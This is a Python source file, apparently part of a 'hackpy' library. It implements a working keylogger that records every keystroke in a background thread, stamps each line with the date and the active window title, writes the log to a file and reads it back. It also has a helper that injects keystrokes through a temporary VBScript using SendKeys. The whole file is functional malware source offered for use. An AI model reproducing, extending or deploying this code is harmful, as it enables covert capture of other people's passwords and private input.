from os import remove, path
from hackpy.time     import *
from hackpy.commands import *
from hackpy.settings import *
from hackpy.activity import *
from pynput.keyboard import Key, Listener
from threading import Thread

# keyPress
def keyPress(key):
	##|
	##| keyPress('Hello my L0rd!!{ENTER}')
	##| All keys: https://pastebin.com/Ns3P7UiH
	##|
	tempfile = temp_path + r'keyboard.vbs'
	with open(tempfile, 'w', encoding = "utf8", errors = 'ignore') as keyboard_path:
		keyboard_path.write('WScript.CreateObject(\"WScript.Shell\").SendKeys \"' + str(key) + '\"')
	command.system(tempfile)
	remove(tempfile)

# KeyLogger module
class Keylogger:
	def __init__(self, filename = 'keylogs.txt'):
		self.filename = filename

	def startHackpyKeyLogger(self):
		global hackpyKeyloggerIsStopped
		hackpyKeyloggerIsStopped = False
		# Write some data
		with open(self.filename, 'a') as logs:
			logs.write('\n(' + date.all() + ') - [' + getActiveWindow() + '] - \"')
		# Replace
		key_map = {
			'Key.space': ' ',
			'Key.enter': '\n',
			'\'': '',
			'Key.': ''
		}
		# Save key
		def on_press(key):
			Key_text = str(key)
			# Replace space, enter to ' ' and '\n'
			for old, new in key_map.items():
				Key_text = Key_text.replace(old, new)
			# If is special key
			if len(Key_text) > 1:
				Key_text = ' [' + Key_text + '] '.upper()
			# If is enter
			if (Key_text == '\n'):
				Key_text = '\"\n' + '(' + date.all() + ') - [' + getActiveWindow() + '] - \"'

			#print(Key_text)
			with open(self.filename, 'a', encoding = "utf8", errors = 'ignore') as logs:
				logs.write(Key_text)
				if hackpyKeyloggerIsStopped:
					logs.write('\"')
					return False

			# if key == Key.esc:
			# 	print('Exit')
			# 	return False

		# Collect keyboard events 
		s = Listener(on_release = on_press)
		s.start()
		s.join()

	# Start keylogger
	def start(self):
		s = Thread(target=self.startHackpyKeyLogger)
		s.start()
	# Stop keylogger
	def stop(self):
		global hackpyKeyloggerIsStopped
		hackpyKeyloggerIsStopped = True

	# Get logs
	def getLogs(self):
		if path.exists(self.filename):
			logs_lines = []
			with open(self.filename, 'r', encoding = "utf8", errors = 'ignore') as logs_file:
				lines = logs_file.readlines()
			for line in lines:
				line = line.replace('\n', '')
				logs_lines.append(line)
			return logs_lines
		else:
			return False

	# Delete logs file
	def cleanLogs(self):
		try:
			remove(self.filename)
		except:
			pass